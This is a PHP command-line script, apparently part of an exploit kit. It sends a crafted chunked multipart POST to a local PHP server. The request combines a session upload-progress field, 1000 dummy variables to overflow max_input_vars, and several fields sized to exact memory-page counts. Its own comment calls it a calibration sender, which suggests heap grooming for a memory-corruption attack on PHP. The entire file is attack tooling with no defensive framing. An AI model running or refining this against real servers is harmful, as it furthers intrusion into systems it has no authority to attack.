<?php
declare(strict_types=1);
/* Calibration sender for the display_errors=Off variant.
 * mode "raw N": PHPSESSID+PROGRESS, 1000 dummy vars, N fields whose raw
 * value is a 511-page buffer (count > max_input_vars -> raw-only). */
const BND = 'CCCCCCCCCC';

function part(string $n, string $v = '', ?string $f = null, ?string $ct = null): string {
    $s = '--' . BND . "\r\nContent-Disposition: form-data; name=\"$n\"";
    if ($f !== null) $s .= "; filename=\"$f\"";
    $s .= "\r\n";
    if ($ct !== null) $s .= "Content-Type: $ct\r\n";
    return $s . "\r\n" . $v . "\r\n";
}
function send(int $port, string $body, float $t = 120.0): string {
    $s = @stream_socket_client("tcp://127.0.0.1:$port", $e, $m, 5.0);
    if (!$s) throw new RuntimeException("connect $m");
    stream_set_timeout($s, (int)$t);
    fwrite($s, "POST /index.php HTTP/1.1\r\nHost: x\r\nContent-Type: multipart/form-data; boundary=" . BND
        . "\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n");
    for ($o = 0; $o < strlen($body); $o += 262144) {
        $c = substr($body, $o, 262144);
        fwrite($s, dechex(strlen($c)) . "\r\n" . $c . "\r\n");
    }
    fwrite($s, "0\r\n\r\n");
    $out = '';
    while (!feof($s)) { $r = fread($s, 65536); if ($r === false || $r === '') break; $out .= $r; }
    fclose($s);
    return $out;
}
$mode = $argv[1] ?? 'raw';
$port = (int)($argv[2] ?? 8091);
$n = (int)($argv[3] ?? 5);
$pages = (int)($argv[4] ?? 511);
$out = part('PHPSESSID', str_repeat('a', 32));
$out .= part('PHP_SESSION_UPLOAD_PROGRESS', 'k0');
if ($mode === 'raw') {
    for ($i = 0; $i < 1000; $i++) $out .= part(sprintf('d%04d', $i), 'x');
}
$len = $pages * 4096 - 25;
for ($i = 0; $i < $n; $i++) $out .= part(sprintf('r%04d', $i), str_repeat('R', $len));
$out .= '--' . BND . "--\r\n";
$r = send($port, $out);
echo "body=", strlen($out), " status=", strtok($r, "\r\n"), "\n";
